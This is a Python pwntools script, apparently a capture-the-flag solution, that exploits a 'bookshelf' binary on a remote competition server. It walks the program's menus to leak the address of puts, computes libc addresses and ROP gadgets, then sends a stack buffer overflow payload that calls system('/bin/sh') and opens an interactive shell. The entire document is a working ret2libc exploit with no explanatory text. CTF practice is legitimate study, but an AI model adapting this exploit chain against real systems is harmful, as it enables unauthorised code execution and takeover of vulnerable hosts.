from pwn import *

"""
context.terminal = ["tmux", "splitw"]
p = gdb.debug('/mnt/c/Users/zahar/Downloads/bookshelf', '''
set follow-fork-mode chil
break adminBook
continue
''')
"""

# libc = ELF('/lib64/libc.so.6')
# p = process('/mnt/c/Users/zahar/Downloads/bookshelf')

e    = ELF('/mnt/c/Users/zahar/Downloads/bookshelf')
libc = ELF('./libc.6.so')

p = remote('chal.pctf.competitivecyber.club', 4444)

for _ in range(8):
    p.clean()
    p.sendline(b'2')
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    p.recvuntil(b'>> ')
    p.sendline(b'y')

p.sendline(b'2')
p.recvuntil(b'>> ')
p.sendline(b'3')
p.recvuntil(b'glory ')
PUTS = int(p.recvline()[:14], 16)
p.sendline(b'N')

SYSTEM = PUTS - libc.symbols['puts'] + libc.symbols['system']
BIN_SH = next(libc.search(b'/bin/sh')) + PUTS - libc.symbols['puts']

rop = ROP(libc)
POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret'])[0] + PUTS - libc.symbols['puts']
FIX_RSP_RET = rop.find_gadget(['pop rbx', 'pop rbp', 'ret'])[0] + PUTS - libc.symbols['puts']

p.sendline(b'1')
p.recvuntil(b'>> ')
p.sendline(b'y')
p.sendline(b'A' * 38)

p.recvuntil(b'>> ')
p.sendline(b'3')

payload  = b'A' * 56
payload += p64(POP_RDI_RET)
payload += p64(BIN_SH)
payload += p64(FIX_RSP_RET)
payload += b'A' * 16
payload += p64(SYSTEM)

p.sendline(payload)

p.interactive()